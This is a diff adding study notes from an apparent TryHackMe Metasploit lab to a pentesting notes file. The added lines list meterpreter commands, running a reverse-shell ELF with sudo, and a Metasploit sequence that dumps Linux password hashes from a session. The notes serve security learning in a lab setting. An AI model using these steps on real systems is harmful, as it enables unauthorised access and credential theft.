@@ -233,3 +233,21 @@ RDP: Could be vulnerable to Bluekeep or allow desktop access if weak credentials
 ----
 
 Note that choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).
+
+----
+
+* https://tryhackme.com/room/metasploitexploitation msfvenom
+* Linux
+  * getuid
+  * sysinfo
+  * shell (open a sh shell)
+  * run exploits ok
+* sudo ./reverse_shell.elf
+
+```
+> bg
+# must be root
+> use post/linux/gather/hashdump
+> set SESSION 1
+> run
+```
